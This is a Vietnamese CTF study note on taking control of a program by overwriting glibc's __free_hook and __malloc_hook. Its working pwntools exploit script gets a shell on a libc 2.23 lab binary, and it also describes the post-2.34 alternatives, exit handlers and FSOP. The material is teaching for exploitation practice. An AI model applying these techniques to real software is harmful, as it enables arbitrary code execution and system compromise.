# Hook overwrite & exit handlers — chiếm điều khiển qua con trỏ hàm libc

> Tài liệu học sâu. Writeup **verify ra shell trên libc 2.23** (bản `_patched` kèm đề). Rất nhạy
> phiên bản glibc (xem §4). Nguồn ở cuối.

---

## 1. Hook là gì?

glibc (≤ 2.33) có các **con trỏ hàm toàn cục** mà allocator gọi *trước* khi làm việc, vốn để
debug (`mtrace`):

| Biến (trong libc) | Được gọi khi | Chữ ký |
|-------------------|--------------|--------|
| `__malloc_hook` | mỗi `malloc(sz)` | `hook(sz, caller)` |
| `__free_hook` | mỗi `free(ptr)` | `hook(ptr, caller)` |
| `__realloc_hook` | mỗi `realloc` | — |

Nếu **ghi đè** được các con trỏ này (chúng nằm trong libc, **ghi được**), thì lần `malloc`/`free`
kế tiếp sẽ **gọi địa chỉ ta chọn** → chiếm điều khiển.

> Nói ngắn: *ghi `__free_hook = &gì_đó`; `free(ptr)` kế sẽ chạy `gì_đó(ptr)`.*

Đặc biệt `__free_hook`: `free(ptr)` → `__free_hook(ptr)`. Nếu đặt `__free_hook = system` và `ptr`
trỏ chuỗi `"/bin/sh"` → `system("/bin/sh")`. Hoặc đặt `__free_hook = one_gadget`.

---

## 2. Điều kiện

1. **Leak libc** (để biết `&__free_hook`, `&system`/one_gadget). Xem [ret2libc.md](ret2libc.md),
   [heap.md §4](heap.md#4-leak-libc-trong-bài-heap).
2. **Một write primitive** để ghi vào `&__free_hook`: arbitrary write, **tcache/fastbin poisoning**
   ([heap.md](heap.md)), hoặc write-what-where sẵn có.
3. **Một lần `malloc`/`free` xảy ra sau đó** để kích hoạt hook.

---

## 3. Chọn giá trị ghi vào hook

| Ghi `__free_hook =` | Cần | Hiệu ứng |
|---------------------|-----|----------|
| `system` | `ptr` (đối số free) = `"/bin/sh"` | `free(chunk "/bin/sh")` → `system("/bin/sh")` |
| **one_gadget** | thoả ràng buộc gadget | `free(bất kỳ)` → execve("/bin/sh") |
| call-site `system("/bin/sh")` trong binary | no-PIE | `free()` nhảy thẳng vào lời gọi có sẵn |

`one_gadget ./libc.so.6` → chọn gadget có ràng buộc dễ thoả nhất tại thời điểm free.

---

## 4. ⚠️ Phiên bản glibc — hook đã bị BỎ từ 2.34

| glibc | Tình trạng hook | Hướng thay thế |
|-------|-----------------|----------------|
| ≤ 2.33 | `__malloc_hook`/`__free_hook` **còn** | ghi hook (bài này, 2.23) |
| **≥ 2.34** | **BỎ hook** | **exit handlers** (`__run_exit_handlers`), **FSOP** (`_IO_FILE` vtable / `_IO_list_all`), `__call_tls_dtors` |

**Thay thế chính khi không còn hook:**
- **Exit handlers:** `exit()` chạy danh sách `__exit_funcs` (các con trỏ `atexit`), được **mã hoá
  bằng PTR_MANGLE** (xoay + XOR với `fs:0x30`). Ghi đè một mục → cần biết/leak khoá mangle, hoặc
  ghi đè khối handler.
- **FSOP / `_IO`**: giả mạo `_IO_FILE` + **vtable** để khi `exit`/`fflush`/`puts` gọi `vtable->...`
  thì nhảy vào gadget (house of apple/orw, `_IO_str_overflow`...).

→ Bài local 2.23 dùng hook trực tiếp; trên **2.39** phải chuyển sang exit-handler/FSOP.

---

## 5. Writeup bài `Hook_Overwrite` (libc 2.23, verify ra shell)

Nguồn:
```c
printf("stdout: %p\n", stdout);          // LEAK libc
scanf("%ld", &size); ptr = malloc(size);
read(0, ptr, size);
*(long *)*ptr = *(ptr+1);                 // WRITE-WHAT-WHERE: *(ptr[0]) = ptr[1]
free(ptr); free(ptr); system("/bin/sh");
```
Có sẵn **leak** (`stdout`) + **write-what-where** (`*(ptr[0]) = ptr[1]`). Dùng write đó đặt
`__free_hook = &(lời gọi system("/bin/sh") trong main)`; `free(ptr)` kế **nhảy vào đó** → shell
(khỏi lo double-free vì free đầu đã cho shell).

```python
#!/usr/bin/env python3
from pwn import *
from pwnld import *

context.binary = exe = ELF("./hook_patched", checksec=False)   # patch về ld/libc 2.23
libc = get_libc()                                              # libc-2.23.so
p = start()

### 1) leak stdout -> rebase libc  (%p hex text)
leak_libc_p(libc.sym._IO_2_1_stdout_, until=b"stdout: ")       # libc.address TỰ rebase

### 2) write-what-where: __free_hook = call-site system("/bin/sh") (no-PIE, cố định)
TARGET = 0x400a11      # trong binary: mov edi,"/bin/sh"; call system@plt
sla("Size: ", "100")
sa("Data: ", flat(libc.sym.__free_hook, TARGET))               # ptr[0]=&__free_hook, ptr[1]=TARGET

### 3) free(ptr) -> __free_hook(ptr) -> nhảy vào TARGET -> system("/bin/sh")
ia()
```
**Log:** `libc base = 0x7aa2...000` (aligned) → `$ id` → shell ✅.
Biến thể cổ điển (không có call-site tiện): `TARGET = one_gadget`, hoặc `__free_hook = system` và
đặt một chunk chứa `"/bin/sh"` rồi `free` nó.

---

## 6. Cạm bẫy

- **Sai bản glibc:** ≥ 2.34 **không còn hook** → đừng ghi `__free_hook`, chuyển exit-handler/FSOP.
- **one_gadget ràng buộc:** gadget yêu cầu `[rsp+x]==0`/`rdx==0`... — kiểm tại thời điểm free,
  đổi gadget nếu không thoả.
- **`__free_hook = system` thì đối số là `ptr`** (con trỏ đang free) → `ptr` phải là `"/bin/sh"`.
- **Leak đúng symbol:** `stdout` (biến) = `_IO_2_1_stdout_` (symbol libc); rebase theo đúng cái đó.

---

## 7. Danh sách bài tập + gợi ý

| Bài | Mức | Học gì | Gợi ý |
|-----|-----|--------|-------|
| **`advance/Hook_Overwrite`** (2.23) | ⭐⭐ | write-what-where → `__free_hook` | **§5** verify ra shell |
| **tcache poison → `__free_hook`** (2.31) | ⭐⭐⭐ | poison fd rồi ghi hook | [heap.md §6](heap.md#6-writeup-b--tcache-poisoning-libc-231-verify-ra-shell) |
| **`__free_hook = one_gadget`** | ⭐⭐⭐ | ràng buộc one_gadget | `one_gadget libc.so.6` |
| **glibc ≥ 2.34 (không hook)** | ⭐⭐⭐⭐ | exit handler / FSOP | house of apple / `_IO` vtable |

**Lộ trình:** hook 2.23 (write→hook) → tcache poison→hook 2.31 → one_gadget → 2.34+ exit-handler/FSOP.

---

## Nguồn tham khảo

- how2heap (Shellphish): <https://github.com/shellphish/how2heap>
- one_gadget: <https://github.com/david942j/one_gadget>
- FSOP / house of apple (glibc ≥ 2.34): tìm "house of apple 2", "_IO_FILE exploitation"
- Patch libc: <https://libc.rip> · `pwninit` · liên quan [heap.md](heap.md), [ret2libc.md](ret2libc.md)
